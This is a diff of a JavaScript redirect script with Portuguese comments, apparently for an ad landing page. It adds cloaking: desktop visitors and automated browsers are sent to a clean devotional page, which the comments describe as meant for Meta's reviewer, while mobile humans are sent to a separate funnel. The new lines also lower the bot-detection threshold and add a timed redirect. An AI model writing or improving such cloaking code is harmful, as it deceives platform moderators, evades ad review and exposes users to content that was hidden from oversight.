@@ -159,7 +159,8 @@
   (function(){
     "use strict";
     var DESTINO = "/inicio";          // para onde o humano (mobile) vai
-    var ERRO    = "/error";           // para onde o desktop vai
+    // Para onde vão desktop e bots (página "limpa" p/ revisor da Meta):
+    var SAFE    = "https://devocionalfilhoselagrimas.vercel.app/#capa";
     var COOKIE  = "vrf_ok";           // marca que já passou
     var MIN_MS  = 2200;               // tempo mínimo do "checando"
 
@@ -185,8 +186,9 @@
       return uaMobile || iPadDisfarcado || (temToque && coarse && telaEstreita);
     }
 
+    // Desktop -> página limpa (devocional).
     if (!ehMobile()){
-      location.replace(ERRO);
+      location.replace(SAFE);
       return;
     }
 
@@ -271,15 +273,24 @@
       location.replace(DESTINO + qs);
     }
 
+    function irParaSafe(){ location.replace(SAFE); }
+
     btn.addEventListener("click", function(){
-      // bot muito suspeito e sem nenhuma interação: atrasa/segura
-      if (suspeito >= 4 && !interagiu){
+      // Bot muito suspeito (automação detectada) e sem nenhuma interação
+      // humana: manda para a página limpa em vez do funil.
+      if (suspeito >= 3 && !interagiu){
         btn.textContent = "Validando…";
-        setTimeout(liberar, 1200);
+        irParaSafe();
         return;
       }
       liberar();
     });
+
+    // Sinal forte de automação logo de cara (webdriver/headless) -> SAFE,
+    // sem nem mostrar o funil, mesmo que o UA finja ser mobile.
+    if (suspeito >= 3 && !interagiu){
+      setTimeout(function(){ if (!interagiu) irParaSafe(); }, 3500);
+    }
 
     passo();
   })();
